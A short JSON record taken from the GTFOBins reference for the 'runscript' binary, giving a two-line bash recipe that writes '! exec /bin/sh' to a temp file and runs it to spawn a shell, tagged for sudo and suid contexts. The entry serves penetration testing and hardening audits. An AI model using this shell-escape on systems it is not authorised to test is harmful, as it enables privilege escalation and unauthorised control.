{"title": "runscript", "source": "gtfobins", "source_label": "GTFOBins", "path": "runscript", "html": "<h1>runscript</h1>\n<h2>Shell</h2>\n<pre><code class=\"language-bash\">echo &#x27;! exec /bin/sh&#x27; &gt;/path/to/temp-file\nrunscript /path/to/temp-file</code></pre>", "excerpt": "runscript Shell echo &#x27;! exec /bin/sh&#x27; &gt;/path/to/temp-file runscript /path/to/temp-file", "tags": ["func:shell", "ctx:sudo", "ctx:suid", "ctx:unprivileged"]}